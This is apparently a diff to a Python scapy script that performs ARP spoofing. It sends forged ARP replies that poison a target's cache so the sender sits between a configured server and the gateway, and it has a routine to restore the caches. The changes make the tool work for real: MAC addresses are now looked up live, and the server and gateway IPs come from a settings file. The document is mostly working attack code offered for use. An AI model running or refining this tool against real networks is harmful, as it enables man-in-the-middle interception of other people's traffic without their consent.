@@ -4,31 +4,33 @@ import time
 
 import scapy.all as scapy
 
+from setting_reader import setting_read, setting_res
+
 
 class ARP:
 
-    def __init__(self, mac=""):
-        self.mac = mac
-
     def get_mac(self, ip):
+
         global mac
+
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-        mac = answered_list[0][1].hwsrc
+        for element in answered_list:
+            mac = str(element[1].hwsrc)
+
         return mac
 
     def spoof(self, target_ip, spoof_ip):
-        # target_mac = get_mac(target_ip)
-        target_mac = "54:ab:3a:81:84:89"
+        target_mac = self.get_mac(target_ip)
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         scapy.send(packet, verbose=False)
 
     def restore(self, destination_ip, source_ip):
-        destination_mac = self.mac
-        source_mac = self.mac
+        destination_mac = self.get_mac(destination_ip)
+        source_mac = self.get_mac(source_ip)
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False)
 
@@ -49,5 +51,7 @@ class ARP:
 
 
 if __name__ == '__main__':
+    setting_read()
+
     arp = ARP()
-    arp.to_arp()
+    arp.to_arp(str(setting_res.get('server_ip')), str(setting_res.get('gateway_ip')))
